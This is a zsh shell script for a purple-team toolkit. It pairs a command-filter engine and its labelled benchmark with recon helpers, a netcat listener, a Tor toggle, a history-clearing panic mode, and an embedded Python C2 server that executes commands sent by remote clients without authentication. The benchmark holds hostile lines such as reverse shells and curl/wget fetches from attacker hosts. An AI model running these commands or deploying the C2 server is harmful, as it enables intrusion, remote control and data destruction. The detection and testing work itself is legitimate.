#!/usr/bin/env zsh
# ==============================================================================
# ANF SHELL v${ANF_VERSION} — Cyber + Research (merged)
# PURPLE-TEAM: C2 + Recon + OSINT + Exploit + Defense + GuardFall + Deteksi C2
# RESEARCH: math/ML/reproducible (stat calc sym plot mlbench dlcheck bib csv)



if [[ -n "${ANF_LOADED:-}" ]]; then return 0; fi
typeset -gr ANF_LOADED=1

[[ -z "${ZSH_VERSION:-}" ]] && { print -u2 "ERROR: Requires zsh"; return 1; }

setopt PIPE_FAIL PROMPT_SUBST NO_NOMATCH NULL_GLOB AUTO_CD EXTENDED_GLOB
setopt HIST_IGNORE_SPACE HIST_IGNORE_DUPS SHARE_HISTORY INC_APPEND_HISTORY
setopt INTERACTIVE_COMMENTS GLOB_DOTS NO_LIST_BEEP NO_BEEP NO_BANG_HIST
autoload -Uz is-at-least
is-at-least 5.0 "${ZSH_VERSION}" || { print -u2 "ERROR: zsh >= 5.0 required"; return 1; }

export ANF_VERSION="1.0.4-cyber"

# ==============================================================================
# SECTION 1 — Colors, Glyphs, Directories, PATH
# ==============================================================================
C_B=$'\e[38;5;240m'; C_A=$'\e[38;5;215m'; C_V=$'\e[38;5;214m'
C_L=$'\e[38;5;94m';  C_T=$'\e[38;5;180m'; C_W=$'\e[38;5;223m'
C_0=$'\e[0m';        C_R=$'\e[38;5;203m'; C_G=$'\e[38;5;114m'
C_Y=$'\e[38;5;214m'; C_M=$'\e[38;5;208m'; C_C=$'\e[38;5;117m'
BOLD=$'\e[1m'; DIM=$'\e[2m'
_ANF_OK="◎"; _ANF_WARN="⚠"; _ANF_ERR="✘"; _ANF_INFO="ℹ"; _ANF_ML="⬡"

export ANF_CACHE_DIR="${ANF_CACHE_DIR:-$HOME/.cache/anf-cyber}"
mkdir -p "$ANF_CACHE_DIR"/{notes,logs,state,workspaces,histfiles,targets,\
c2/{payloads,sessions,logs},benchmarks,eval/{datasets,results},ml/features} 2>/dev/null
chmod 700 "$ANF_CACHE_DIR" 2>/dev/null

typeset -U path
path=("$HOME/.local/bin" "$HOME/bin" "$HOME/go/bin" "$HOME/.cargo/bin" \
      "$HOME/.npm-global/bin" "$HOME/.hermes/bin" "/opt/homebrew/bin" \
      "/opt/homebrew/sbin" "/usr/local/bin" "/snap/bin" $path)
[[ -d "$HOME/.opencode/bin" ]] && path=("$HOME/.opencode/bin" $path)

typeset -g AF_LOG_FILE="$ANF_CACHE_DIR/logs/anf-cyber.log"
typeset -g AF_LOG_LEVEL="${AF_LOG_LEVEL:-INFO}"
typeset -gA _ANF_LOG_RANK=(DEBUG 0 INFO 1 WARN 2 ERR 3 OK 1)

# ==============================================================================
# SECTION 2 — Core Utilities (Logging, Validation, Helpers)
# ==============================================================================
_anf_notify() {
    command -v notify-send >/dev/null 2>&1 && \
        notify-send "$1" "$2" -u normal -i utilities-terminal 2>/dev/null
}

_anf_log() {
    local level="$1"; shift
    local color="$C_T" glyph="$_ANF_INFO" rank=1
    case "$level" in
        ok)   color=$C_G; glyph=$_ANF_OK;   rank=1 ;;
        warn) color=$C_Y; glyph=$_ANF_WARN; rank=2 ;;
        err)  color=$C_R; glyph=$_ANF_ERR;  rank=3 ;;
        ml)   color=$C_C; glyph=$_ANF_ML;   rank=1 ;;
    esac
    mkdir -p "${AF_LOG_FILE:h}" 2>/dev/null
    print -r -- "$(date '+%Y-%m-%d %H:%M:%S') [${(U)level}] $*" \
        >> "$AF_LOG_FILE" 2>/dev/null
    (( rank >= ${_ANF_LOG_RANK[${(U)AF_LOG_LEVEL}]:-1} )) && \
        print -u2 "   ${color}${glyph}${C_0}  $*"
}

_anf_validate_port() { [[ "$1" =~ ^[0-9]+$ ]] && (( $1 >= 1 && $1 <= 65535 )); }
_anf_validate_ip()   {
    local v4='^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
    [[ "$1" =~ $v4 ]]
}
_anf_validate_host() { [[ "$1" =~ ^[A-Za-z0-9._:-]+$ ]]; }
_anf_float_gt() { awk -v a="$1" -v b="$2" 'BEGIN {exit !(a > b)}'; }
_anf_float_lt() { awk -v a="$1" -v b="$2" 'BEGIN {exit !(a < b)}'; }

_anf_resolve_host() {
    local host="$1" ip
    _anf_validate_ip "$host" && { print -r -- "$host"; return 0; }
    if command -v dig >/dev/null; then
        ip=$(dig +short "$host" A 2>/dev/null | head -1)
    elif command -v host >/dev/null; then
        ip=$(host -t A "$host" 2>/dev/null | awk '{print $NF}' | head -1)
    elif command -v getent >/dev/null; then
        ip=$(getent ahosts "$host" 2>/dev/null | head -1 | cut -d' ' -f1)
    fi
    _anf_validate_ip "$ip" && print -r -- "$ip" || return 1
}

_anf_with_timeout() {
    local t=${1:-30}; shift
    if command -v timeout >/dev/null 2>&1; then timeout "$t" "$@"
    elif command -v gtimeout >/dev/null 2>&1; then gtimeout "$t" "$@"
    else
        ( "$@" ) & local pid=$!
        { sleep "$t"; kill -HUP $pid 2>/dev/null; } &
        wait $pid 2>/dev/null
    fi
}

# --- Helper: resolusi binary & kotak ------------------------------------------
# PITFALL: `command -v <nama>` di dalam shell ANF mengembalikan TEKS ALIAS
# (mis. "alias hermes=anf_hermes"), bukan path binary — karena setiap command ANF
# didaftarkan sebagai alias nama polos. Akibatnya cek tool selalu lolos dan teks
# alias itu bahkan ikut dieksekusi. Untuk mencari binary SELALU pakai
# _anf_has_bin/_anf_which: `whence -p` hanya menyisir PATH (alias diabaikan).
_anf_which() { whence -p -- "$1" 2>/dev/null }
_anf_has_bin() { [[ -n "$(_anf_which "$1")" ]] }

# Kotak berjudul: lebar border dihitung dari ISI, bukan spasi hardcoded, jadi
# tidak pernah meleset walau judul memuat versi/angka yang berubah.
# Pakai: _anf_box <warna> "judul" ["baris kedua" ...]
_anf_box() {
    local col="$1"; shift
    local -a lines=("$@")
    local line max=0
    for line in "${lines[@]}"; do
        if (( ${#line} > max )); then max=${#line}; fi
    done
    local bar="$(printf '═%.0s' {1..$((max + 2))})"
    print -r -- "${col}╔${bar}╗${C_0}"
    for line in "${lines[@]}"; do
        printf '%s║%s %s%*s %s║%s\n' "$col" "$C_0" "$line" $((max - ${#line})) '' "$col" "$C_0"
    done
    print -r -- "${col}╚${bar}╝${C_0}"
}

_anf_confirm() {
    local ans
    read -r "ans?${C_Y}${1:-Proceed? [y/N]} ${C_0}"
    [[ "$ans" == [Yy]* ]]
}

_anf_check_sudo() {
    command -v sudo >/dev/null 2>&1 || { _anf_log err "sudo not available"; return 1; }
    sudo -n true 2>/dev/null || _anf_log warn "Passwordless sudo not available."
    return 0
}

_anf_get_pkg_mgr() {
    command -v apt    >/dev/null && echo apt    && return
    command -v pacman >/dev/null && echo pacman && return
    command -v dnf    >/dev/null && echo dnf    && return
    command -v brew   >/dev/null && echo brew   && return
    echo unknown
}

# ==============================================================================
# SECTION 3 — GuardFall v2: Enhanced Security Engine
# [FIX-GF] [NEW-GF-M] [NEW-BENCH]
#
# Perubahan dari v13:
#   - Unicode/homoglyph normalization (bypass via lookalike chars)
#   - Expanded patterns: env injection, path traversal, fork bomb, net exfil
#   - Metrics tracking: TP, FP, FN, TN → Precision, Recall, F1
#   - Benchmark dataset berlabel (ATTACK/BENIGN) untuk evaluasi kuantitatif
# ==============================================================================

# --- 3.1 Audit + Session ---
_ANF_AUDIT_LOG="$ANF_CACHE_DIR/logs/audit.jsonl"
_ANF_SESSION_ID="${ANF_SESSION:-$(date +%Y%m%d_%H%M%S)}"

_anf_audit_log() {
    local cmd="$1" canonical="$2" decision="$3"
    local ts
    ts="$(date -u +"%Y-%m-%dT%H:%M:%SZ")"
    if command -v jq >/dev/null 2>&1; then
        jq -n \
            --arg ts "$ts" --arg session "$_ANF_SESSION_ID" \
            --arg user "$USER" --arg cmd "$cmd" \
            --arg canonical "$canonical" --arg decision "$decision" \
            '{timestamp:$ts,session:$session,user:$user,
              command:$cmd,canonical:$canonical,decision:$decision}' \
            >> "$_ANF_AUDIT_LOG" 2>/dev/null
    else
        printf '{"timestamp":"%s","session":"%s","user":"%s","command":"%s","decision":"%s"}\n' \
            "$ts" "$_ANF_SESSION_ID" "$USER" \
            "${cmd//\"/\\\"}" "$decision" >> "$_ANF_AUDIT_LOG" 2>/dev/null
    fi
}

# --- 3.2 Metrics (per-session counters) [NEW-GF-M] ---
typeset -g AF_GF_METRICS_FILE="$ANF_CACHE_DIR/logs/gf_metrics_${_ANF_SESSION_ID}.json"
typeset -gi _ANF_GF_TP=0 _ANF_GF_FP=0 _ANF_GF_FN=0 _ANF_GF_TN=0

_anf_gf_record() {
    # $1: decision (BLOCK|ALLOW), $2: ground_truth (ATTACK|BENIGN)
    # Hanya digunakan saat benchmark berlabel
    case "${1}_${2}" in
        BLOCK_ATTACK) (( _ANF_GF_TP++ )) ;;
        BLOCK_BENIGN) (( _ANF_GF_FP++ )) ;;
        ALLOW_ATTACK) (( _ANF_GF_FN++ )) ;;
        ALLOW_BENIGN) (( _ANF_GF_TN++ )) ;;
    esac
}

anf_guardfall_metrics() {
    local tp=$_ANF_GF_TP fp=$_ANF_GF_FP fn=$_ANF_GF_FN tn=$_ANF_GF_TN
    local precision recall f1 accuracy
    precision=$(awk -v tp=$tp -v fp=$fp \
        'BEGIN{d=tp+fp; printf "%.4f", (d>0?tp/d:0)}')
    recall=$(awk -v tp=$tp -v fn=$fn \
        'BEGIN{d=tp+fn; printf "%.4f", (d>0?tp/d:0)}')
    f1=$(awk -v p=$precision -v r=$recall \
        'BEGIN{d=p+r; printf "%.4f", (d>0?2*p*r/d:0)}')
    accuracy=$(awk -v tp=$tp -v tn=$tn -v fp=$fp -v fn=$fn \
        'BEGIN{d=tp+tn+fp+fn; printf "%.4f", (d>0?(tp+tn)/d:0)}')

    print "${C_Y}=== GUARDFALL v2 METRICS ===${C_0}"
    printf "  %-22s ${C_G}%d${C_0}\n" "True Positives:"  $tp
    printf "  %-22s ${C_R}%d${C_0}\n" "False Positives:" $fp
    printf "  %-22s ${C_R}%d${C_0}\n" "False Negatives:" $fn
    printf "  %-22s ${C_G}%d${C_0}\n" "True Negatives:"  $tn
    print  "  ───────────────────────────"
    printf "  %-22s ${C_C}%s${C_0}\n" "Precision:"  $precision
    printf "  %-22s ${C_C}%s${C_0}\n" "Recall:"     $recall
    printf "  %-22s ${C_C}%s${C_0}\n" "F1-Score:"   $f1
    printf "  %-22s ${C_C}%s${C_0}\n" "Accuracy:"   $accuracy

    # Persist ke JSON untuk analisis lanjutan
    if command -v jq >/dev/null 2>&1; then
        jq -n \
            --arg ts "$(date -u +"%Y-%m-%dT%H:%M:%SZ")" \
            --arg session "$_ANF_SESSION_ID" \
            --argjson tp $tp --argjson fp $fp \
            --argjson fn $fn --argjson tn $tn \
            --argjson p "$precision" --argjson r "$recall" \
            --argjson f "$f1" --argjson a "$accuracy" \
            '{timestamp:$ts,session:$session,
              tp:$tp,fp:$fp,fn:$fn,tn:$tn,
              precision:$p,recall:$r,f1:$f,accuracy:$a}' \
            > "$AF_GF_METRICS_FILE" 2>/dev/null
        _anf_log ok "Metrics → $AF_GF_METRICS_FILE"
    fi
}

# --- 3.3 Unicode/Homoglyph Normalization [FIX-GF] ---
_anf_normalize_unicode() {
    local cmd="$1"
    # Full-width karakter (Unicode block FF00-FF5E) → ASCII
    cmd=${cmd//ｒｍ/rm};     cmd=${cmd//ｃｕｒｌ/curl}
    cmd=${cmd//ｗｇｅｔ/wget}; cmd=${cmd//ｍｋｆｓ/mkfs}
    cmd=${cmd//ｄｄ/dd};      cmd=${cmd//ｎｃ/nc}
    # Hapus zero-width chars (ZWJ, ZWNJ, BOM, soft-hyphen)
    cmd="${cmd//$'\u200b'/}"; cmd="${cmd//$'\u200c'/}"
    cmd="${cmd//$'\u200d'/}"; cmd="${cmd//$'\ufeff'/}"
    cmd="${cmd//$'\u00ad'/}"
    # Hapus null bytes
    cmd="${cmd//$'\x00'/}"
    print -r -- "$cmd"
}

# --- 3.4 GuardFall Engine v2 ---
_anf_canonicalize_command() {
    local cmd="$1" original="$1"

    # Step 1: Unicode normalization
    cmd=$(_anf_normalize_unicode "$cmd")

    # Step 2: Strip kutip untuk normalisasi pola
    cmd=${cmd//\'/}
    cmd=${cmd//\"/}

    # Step 3: IFS manipulation — semua varian [FIX-GF]
    # $IFS, ${IFS}, ${IFS:-}, IFS=, tab-as-separator
    if [[ "$cmd" == *'$IFS'*   || "$cmd" == *'${IFS}'* || \
          "$cmd" == *'${IFS'*  || "$cmd" == *'IFS='*   || \
          "$cmd" == *$'\t'* ]]; then
        _anf_log warn "IFS manipulation detected → blocked"
        _anf_audit_log "$original" "" "BLOCKED:ifs_manipulation"
        return 1
    fi

    # Step 4: Process & command substitution
    if [[ "$cmd" == *'=('* || "$cmd" == *'<('* ]]; then
        _anf_log warn "Process substitution blocked"
        _anf_audit_log "$original" "" "BLOCKED:process_substitution"
        return 1
    fi
    if [[ "$cmd" == *'$('* || "$cmd" == *'`'* ]]; then
        _anf_log warn "Command substitution blocked"
        _anf_audit_log "$original" "" "BLOCKED:command_substitution"
        return 1
    fi

    # Step 5: Destructive commands
    local re_rm='^rm[[:space:]].*-[a-zA-Z]*[rR][a-zA-Z]*[fF]'
    local re_dd='^dd[[:space:]]+if=/dev/(zero|random|urandom)'
    local re_mkfs='^(mkfs|shred|wipefs|format)'
    if [[ "$cmd" =~ $re_rm || "$cmd" =~ $re_dd || "$cmd" =~ $re_mkfs ]]; then
        _anf_log err "DESTRUCTIVE COMMAND BLOCKED: $original"
        _anf_audit_log "$original" "" "BLOCKED:destructive"
        return 1
    fi

    # Step 6: Network exfiltration ke IP lokal/private [NEW-GF]
    local re_net='^(curl|wget|nc|ncat|netcat)[[:space:]].*https?://(([0-9]{1,3}\.){3}[0-9]{1,3}|localhost)'
    if [[ "$cmd" =~ $re_net ]]; then
        _anf_log err "NETWORK EXFIL BLOCKED (private IP): $original"
        _anf_audit_log "$original" "" "BLOCKED:network_exfil"
        return 1
    fi

    # Step 7: Environment variable injection [NEW-GF]
    local re_env='^(export|declare)[[:space:]]+(LD_PRELOAD|LD_LIBRARY_PATH|DYLD_INSERT|DYLD_LIBRARY)='
    if [[ "$cmd" =~ $re_env ]]; then
        _anf_log err "ENV INJECTION BLOCKED: $original"
        _anf_audit_log "$original" "" "BLOCKED:env_injection"
        return 1
    fi

    # Step 8: Path traversal yang agresif [NEW-GF]
    local re_trav='(\.\./){3,}'
    if [[ "$cmd" =~ $re_trav ]]; then
        _anf_log warn "Path traversal detected: $original"
        _anf_audit_log "$original" "" "BLOCKED:path_traversal"
        return 1
    fi

    # Step 9: Fork bomb [NEW-GF]
    local re_fork=':\(\)\{.*:\|:.*\}'
    if [[ "$cmd" =~ $re_fork ]]; then
        _anf_log err "FORK BOMB BLOCKED: $original"
        _anf_audit_log "$original" "" "BLOCKED:fork_bomb"
        return 1
    fi

    _anf_audit_log "$original" "$cmd" "ALLOWED"
    print -r -- "$cmd"
    return 0
}

# --- 3.5 Benchmark dengan Labeled Dataset [NEW-BENCH] ---
anf_benchmark_guardfall() {
    # Format: "command|ATTACK" atau "command|BENIGN"
    local -a dataset=(
        # === ATTACK patterns ===
        "rm'' -rf'' /|ATTACK"
        "curl\$IFS-s\$IFShttp://attacker.com|ATTACK"
        "\$(curl http://attacker.com)|ATTACK"
        "=(echo malicious)|ATTACK"
        "export LD_PRELOAD=/tmp/evil.so|ATTACK"
        "dd if=/dev/zero of=/dev/sda|ATTACK"
        ":(){ :|:& };:|ATTACK"
        "curl http://192.168.1.100/shell.sh|ATTACK"
        "wget http://10.0.0.1/malware.sh|ATTACK"
        "cat ../../../etc/passwd|ATTACK"
        "nc -e /bin/sh 10.0.0.1 4444|ATTACK"
        "declare LD_LIBRARY_PATH=/tmp/evil|ATTACK"
        # === BENIGN commands ===
        "nmap -sV 192.168.1.1|BENIGN"
        "git clone https://github.com/user/repo|BENIGN"
        "python3 script.py|BENIGN"
        "ls -la /home|BENIGN"
        "grep -r pattern ./src|BENIGN"
        "cat /etc/hosts|BENIGN"
        "curl https://api.github.com/repos/user/repo|BENIGN"
        "subfinder -silent -d example.com|BENIGN"
    )

    # Reset counters untuk benchmark bersih
    _ANF_GF_TP=0; _ANF_GF_FP=0; _ANF_GF_FN=0; _ANF_GF_TN=0

    _anf_box "$C_Y" "GUARDFALL v2 BENCHMARK"
    printf "  %s%-12s %-32s %s%s\n" "$DIM" "Result" "Command" "Label" "$C_0"
    print "  ─────────────────────────────────────────"

    local n_attack=0 n_benign=0
    for entry in "${dataset[@]}"; do
        local cmd="${entry%|*}" truth="${entry##*|}"
        local blocked=false
        _anf_canonicalize_command "$cmd" >/dev/null 2>&1 || blocked=true

        if [[ "$truth" == "ATTACK" ]]; then
            (( n_attack++ ))
            if $blocked; then
                printf "  ${C_G}%-12s${C_0} %-32s %s\n" "[TP] BLOCKED" "${cmd:0:31}" "ATTACK"
                _anf_gf_record BLOCK ATTACK
            else
                printf "  ${C_R}%-12s${C_0} %-32s %s\n" "[FN] BYPASSED" "${cmd:0:31}" "ATTACK"
                _anf_gf_record ALLOW ATTACK
            fi
        else
            (( n_benign++ ))
            if $blocked; then
                printf "  ${C_Y}%-12s${C_0} %-32s %s\n" "[FP] BLOCKED" "${cmd:0:31}" "BENIGN"
                _anf_gf_record BLOCK BENIGN
            else
                printf "  ${C_G}%-12s${C_0} %-32s %s\n" "[TN] PASSED" "${cmd:0:31}" "BENIGN"
                _anf_gf_record ALLOW BENIGN
            fi
        fi
    done

    print "\n  ─────────────────────────────────────────"
    print "  ${DIM}Dataset: $n_attack attack patterns, $n_benign benign commands${C_0}\n"
    anf_guardfall_metrics
}

# Policy file (opsional, untuk rule kustom)
_ANF_POLICY_FILE="$ANF_CACHE_DIR/policy.json"
_anf_init_policy() {
    [[ -f "$_ANF_POLICY_FILE" ]] && return
    mkdir -p "$(dirname "$_ANF_POLICY_FILE")" 2>/dev/null
    cat > "$_ANF_POLICY_FILE" << 'EOF'
{
  "version": "2.0",
  "semantic_rules": [
    {"name": "forbid_rm_root",  "pattern": "^rm\\s+(-[rf]+\\s+)*/?$", "action": "BLOCK"},
    {"name": "allow_git_clone", "pattern": "^git clone",               "action": "ALLOW"}
  ]
}
EOF
}

# ==============================================================================
# SECTION 4 — Target, Workspace, Notes, Status
# ==============================================================================
AF_TARGETS_FILE="$ANF_CACHE_DIR/targets/list.txt"

anf_set_target() {
    [[ -z "$1" ]] && { _anf_log warn "Usage: /set-target <host>"; return 1; }
    local t="${1#http://}"; t="${t#https://}"; t="${t%%/*}"
    _anf_validate_host "$t" || { _anf_log err "Invalid host: $t"; return 1; }
    export T="$t"; export ANF_WS="${ANF_WS:-$t}"
    mkdir -p "$ANF_CACHE_DIR/workspaces/$t"/{notes,scans,screenshots,loot} 2>/dev/null
    grep -qxF "$t" "$AF_TARGETS_FILE" 2>/dev/null || print -r -- "$t" >> "$AF_TARGETS_FILE"
    _anf_log ok "Target set: $T"
}

anf_reset_target() { unset T; _anf_log ok "Target cleared."; }

anf_workspace() {
    export ANF_WS="${1:-general}"
    mkdir -p "$ANF_CACHE_DIR/workspaces/$ANF_WS"/{notes,scans,screenshots,loot} 2>/dev/null
    _anf_log ok "Workspace: $ANF_WS"
}

anf_note() {
    [[ -z "$1" ]] && return 1
    local d="$ANF_CACHE_DIR/workspaces/${ANF_WS:-general}/notes"
    mkdir -p "$d" 2>/dev/null
    print "[$(date '+%H:%M:%S')] $*" >> "$d/$(date +%Y%m%d)_log.md"
    _anf_log ok "Note saved."
}

anf_status() {
    print "${C_Y}=== SESSION STATUS ===${C_0}"
    _anf_log info "Target:    ${T:-<unset>}"
    _anf_log info "Workspace: ${ANF_WS:-<unset>}"
    _anf_log info "Session:   $_ANF_SESSION_ID"
    _anf_log info "Version:   $ANF_VERSION"
    _anf_log info "Log:       $AF_LOG_FILE"
}

anf_doctor() {
    print "${C_Y}=== TOOL HEALTH CHECK ===${C_0}"
    local -a tools=(
        curl wget nmap ffuf subfinder httpx jq nc python3 git dig
        amass gobuster nikto suricata yara fzf tmux holehe nuclei
        rlwrap  # shlex dicek sbg modul python (bukan binary CLI)
    )
    local -a missing=()
    for tool in "${tools[@]}"; do
        _anf_has_bin "$tool" \
            && _anf_log ok "$tool" \
            || { _anf_log err "$tool MISSING"; missing+=("$tool"); }
    done
    # shlex = modul python stdlib, bukan binary — cek via python
    if python3 -c 'import shlex' >/dev/null 2>&1; then
        _anf_log ok "shlex (python module)"
    else
        _anf_log err "shlex MISSING"
        missing+=(shlex)
    fi
    (( ${#missing} > 0 )) && \
        _anf_log warn "Missing tools: ${missing[*]}"
}

# ==============================================================================
# SECTION 5 — Recon & Network Utilities
# ==============================================================================
anf_subdomains() {
    local target="${1:-$T}"
    [[ -z "$target" ]] && { _anf_log err "No target. Use /set-target <host>"; return 1; }
    local outfile="$ANF_CACHE_DIR/workspaces/${ANF_WS:-general}/scans/subdomains_${target}_$(date +%Y%m%d).txt"
    mkdir -p "${outfile:h}"
    command -v subfinder >/dev/null 2>&1 || { _anf_log err "subfinder missing"; return 1; }
    subfinder -silent -d "$target" | tee -a "$outfile"
    _anf_log ok "Saved: $outfile"
}

anf_scan() {
    local target="${1:-$T}"
    [[ -z "$target" ]] && { _anf_log err "No target."; return 1; }
    command -v nmap >/dev/null 2>&1 || { _anf_log err "nmap missing"; return 1; }
    _anf_confirm "Run nmap -sV -sC on $target?" || return 0
    _anf_check_sudo || return 1
    local outfile="$ANF_CACHE_DIR/workspaces/${ANF_WS:-general}/scans/nmap_${target}_$(date +%Y%m%d).txt"
    sudo nmap -sV -sC -T4 "$target" | tee "$outfile"
    _anf_log ok "Scan saved: $outfile"
}

anf_serve() {
    local port="${1:-8080}" root="${2:-.}"
    _anf_validate_port "$port" || return 1
    _anf_confirm "Start HTTP server on :$port in $root?" || return 0
    ( cd "$root" && exec python3 -m http.server "$port" >/dev/null 2>&1 ) &
    local pid=$!
    print $pid > "$ANF_CACHE_DIR/state/serve.pid"
    _anf_log ok "HTTP server :$port (PID: $pid)"
}

anf_serve_stop() {
    local pidfile="$ANF_CACHE_DIR/state/serve.pid"
    if [[ -f "$pidfile" ]]; then
        local pid
        pid=$(cat "$pidfile" 2>/dev/null)
        kill "$pid" 2>/dev/null && rm -f "$pidfile" && \
            _anf_log ok "HTTP server stopped (PID: $pid)"
    else
        _anf_log warn "No running HTTP server."
    fi
}

anf_listen() {
    local port="${1:-4444}"
    _anf_validate_port "$port" || return 1
    command -v rlwrap >/dev/null 2>&1 \
        && rlwrap -S 'af> ' nc -lvnp "$port" \
        || nc -lvnp "$port"
}

# [FIX-PANIC] Hapus rm ~/.zsh_history (destructive & irreversible)
# Ganti: unset HISTFILE saja, tambah audit log sebelum sanitasi
anf_panic() {
    print -r "${C_R}[!] PANIC MODE — SANITIZING SHELL ENVIRONMENT${C_0}"
    # Catat event panic ke audit log sebelum sanitasi
    _anf_audit_log "PANIC" "" "PANIC:initiated by $USER at $(date -u +'%Y-%m-%dT%H:%M:%SZ')"
    unset T http_proxy https_proxy ALL_PROXY
    anf_serve_stop
    anf_c2_stop
    kill $(jobs -p) 2>/dev/null || true
    # Unset HISTFILE saja — jangan hapus file secara permanen
    unset HISTFILE
    fc -p /dev/null
    command clear
    _anf_log ok "Panic complete. Session sanitized."
}

anf_tor() {
    case "$1" in
        on)  export ALL_PROXY="socks5h://127.0.0.1:9050"
             export http_proxy="$ALL_PROXY" https_proxy="$ALL_PROXY"
             _anf_log ok "Tor enabled via socks5h://127.0.0.1:9050" ;;
        off) unset ALL_PROXY http_proxy https_proxy
             _anf_log ok "Tor disabled." ;;
        *)   _anf_log warn "Usage: /tor [on|off]" ;;
    esac
}

anf_encode() { [[ -n "$1" ]] && print -n -- "$1" | base64; }
anf_decode() { [[ -n "$1" ]] && { print -n -- "$1" | base64 -d; print; }; }

anf_hash() {
    [[ -z "$1" ]] && { _anf_log err "Usage: /hash <string>"; return 1; }
    command -v md5sum    >/dev/null 2>&1 && \
        printf "  %-8s %s\n" "MD5:"    "$(print -n -- "$1" | md5sum    | cut -d' ' -f1)"
    command -v sha256sum >/dev/null 2>&1 && \
        printf "  %-8s %s\n" "SHA256:" "$(print -n -- "$1" | sha256sum | cut -d' ' -f1)"
    command -v sha512sum >/dev/null 2>&1 && \
        printf "  %-8s %s\n" "SHA512:" "$(print -n -- "$1" | sha512sum | cut -d' ' -f1)"
}

# ==============================================================================
# SECTION 6 — C2 Framework (HARDENED v2)
# [FIX-C2] os.popen() → subprocess.run() + shlex + sandbox
# [NEW-C2LOG] Session logging ke JSONL
# [NEW-C2KILL] SIGTERM graceful shutdown
# ==============================================================================
typeset -g AF_C2_DIR="$ANF_CACHE_DIR/c2"
typeset -g AF_C2_PID_FILE="$AF_C2_DIR/c2_server.pid"

anf_c2_start() {
    local port="${1:-4444}"
    _anf_validate_port "$port" || return 1

    if [[ -f "$AF_C2_PID_FILE" ]] && kill -0 "$(cat "$AF_C2_PID_FILE")" 2>/dev/null; then
        _anf_log err "C2 already running. Use /c2-stop first."
        return 1
    fi

    # [FIX-C2] Rewrite C2 server: subprocess.run() + input sanitization
    cat > "$AF_C2_DIR/server.py" << 'PYEOF'
#!/usr/bin/env python3
"""
ANF C2 Server v14 — Hardened
Fix: os.popen() → subprocess.run() + shlex parsing + timeout + blocklist
New: JSONL session logging, SIGTERM graceful shutdown, sandbox CWD
"""
import socket, threading, subprocess, shlex, json, sys, os, signal
from datetime import datetime, timezone

PORT        = int(sys.argv[1]) if len(sys.argv) > 1 else 4444
LOG_DIR     = sys.argv[2]      if len(sys.argv) > 2 else "/tmp"
SESSION_LOG = os.path.join(LOG_DIR, "c2_sessions.jsonl")
MAX_INPUT   = 1024  # bytes — limit input panjang

# Blocklist perintah berbahaya (konteks lab riset)
CMD_BLOCKLIST = {
    "rm", "dd", "mkfs", "shred", "wipefs", "format",
    "reboot", "shutdown", "halt", "poweroff"
}

def log_event(client_addr: tuple, cmd: str, output: str, blocked: bool):
    """Append session event ke JSONL."""
    event = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "client":    f"{client_addr[0]}:{client_addr[1]}",
        "command":   cmd,
        "blocked":   blocked,
        "output_len": len(output),
    }
    try:
        with open(SESSION_LOG, "a", encoding="utf-8") as f:
            f.write(json.dumps(event) + "\n")
    except OSError:
        pass


def run_command(cmd: str) -> tuple[str, bool]:
    """
    [FIX-C2] Eksekusi aman via subprocess.run().
    - shlex.split() → cegah shell injection
    - timeout=15s   → cegah hanging
    - cwd=/tmp      → sandbox working directory
    - capture_output → tidak buka shell baru
    Returns: (output_string, was_blocked)
    """
    # Parse terlebih dahulu
    try:
        args = shlex.split(cmd)
    except ValueError as e:
        return f"[PARSE ERROR] {e}\n", False

    if not args:
        return "", False

    # Cek blocklist
    if args[0] in CMD_BLOCKLIST:
        msg = f"[BLOCKED] '{args[0]}' is not allowed in this C2 context.\n"
        return msg, True

    # Eksekusi
    try:
        result = subprocess.run(
            args,
            capture_output=True,
            text=True,
            timeout=15,
            cwd="/tmp",             # Sandbox dir
            env={"PATH": "/usr/bin:/bin:/usr/local/bin"},  # Minimal env
        )
        output = result.stdout
        if result.stderr:
            output += f"[STDERR] {result.stderr}"
        return output or "[no output]\n", False
    except subprocess.TimeoutExpired:
        return "[TIMEOUT] Command exceeded 15 seconds.\n", False
    except FileNotFoundError:
        return f"[ERROR] Not found: {args[0]}\n", False
    except PermissionError:
        return f"[ERROR] Permission denied: {args[0]}\n", False
    except Exception as e:
        return f"[ERROR] {type(e).__name__}: {e}\n", False


def handle_client(conn: socket.socket, addr: tuple):
    """Thread handler per koneksi."""
    print(f"[+] Connection: {addr[0]}:{addr[1]}", flush=True)
    try:
        conn.sendall(b"AF-C2 v14> ")
        while True:
            data = conn.recv(MAX_INPUT)
            if not data:
                break
            cmd = data.decode("utf-8", errors="replace").strip()
            if not cmd:
                conn.sendall(b"AF-C2 v14> ")
                continue
            if cmd.lower() in ("exit", "quit", "bye"):
                conn.sendall(b"[*] Bye.\n")
                break
            output, blocked = run_command(cmd)
            log_event(addr, cmd, output, blocked)
            conn.sendall(
                output.encode("utf-8", errors="replace") + b"\nAF-C2 v14> "
            )
    except (ConnectionResetError, BrokenPipeError):
        print(f"[-] Client {addr[0]} disconnected.", flush=True)
    except Exception as e:
        print(f"[ERR] handle_client: {e}", flush=True)
    finally:
        conn.close()


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", PORT))
    server.listen(5)
    print(f"[*] AF-C2 v14 listening on 0.0.0.0:{PORT}", flush=True)
    print(f"[*] Session log: {SESSION_LOG}",             flush=True)

    def _shutdown(sig, frame):
        print("\n[*] SIGTERM received — shutting down.", flush=True)
        server.close()
        sys.exit(0)

    signal.signal(signal.SIGTERM, _shutdown)
    signal.signal(signal.SIGINT,  _shutdown)

    while True:
        try:
            conn, addr = server.accept()
            t = threading.Thread(
                target=handle_client, args=(conn, addr), daemon=True
            )
            t.start()
        except OSError:
            break


if __name__ == "__main__":
    main()
PYEOF

    nohup python3 "$AF_C2_DIR/server.py" "$port" "$AF_C2_DIR/logs" \
        >> "$AF_C2_DIR/logs/stdout.log" 2>&1 &
    local pid=$!
    print $pid > "$AF_C2_PID_FILE"
    _anf_log ok "C2 v14 started — PID: $pid | Port: $port"
    _anf_log info "Session log: $AF_C2_DIR/logs/c2_sessions.jsonl"
}

anf_c2_stop() {
    if [[ -f "$AF_C2_PID_FILE" ]]; then
        local pid
        pid=$(cat "$AF_C2_PID_FILE")
